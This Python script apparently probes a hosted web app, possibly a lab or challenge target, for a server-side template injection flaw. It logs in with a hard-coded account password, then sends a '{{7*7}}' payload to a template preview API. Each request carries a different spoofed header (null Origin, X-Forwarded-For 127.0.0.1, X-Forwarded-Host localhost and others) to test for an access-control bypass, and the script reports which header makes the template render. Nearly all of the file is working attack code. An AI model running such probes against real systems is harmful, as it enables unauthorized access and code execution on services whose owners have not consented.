import requests, time, base64

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        if s.cookies.get('session'):
            return s
        time.sleep(25)
    return None

s = login()
b64 = base64.b64encode(b'Hello {{7*7}} World').decode()
body = {'content_b64': b64, 'context': {}}

hdrsets = [
    ('origin-null', {'Origin': 'null'}),
    ('origin-app', {'Origin': base}),
    ('referer-editor', {'Referer': base + '/templates/3/edit'}),
    ('xff-localhost', {'X-Forwarded-For': '127.0.0.1'}),
    ('xrw', {'X-Requested-With': 'XMLHttpRequest'}),
    ('origin-null+xrw', {'Origin': 'null', 'X-Requested-With': 'XMLHttpRequest'}),
    ('origin-file', {'Origin': 'file://'}),
    ('host-localhost', {'X-Forwarded-Host': 'localhost'}),
]

def call(h):
    for a in range(6):
        try:
            r = s.post(base + '/api/templates/preview', json=body, headers=h, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        return r.status_code, r.text[:200]
    return 'TRANSIENT', ''

for name, h in hdrsets:
    sc, txt = call(h)
    hit = '49' in txt
    print(name, sc, ('<<<RENDERED 49' if hit else ''), txt[:120])
    time.sleep(2)
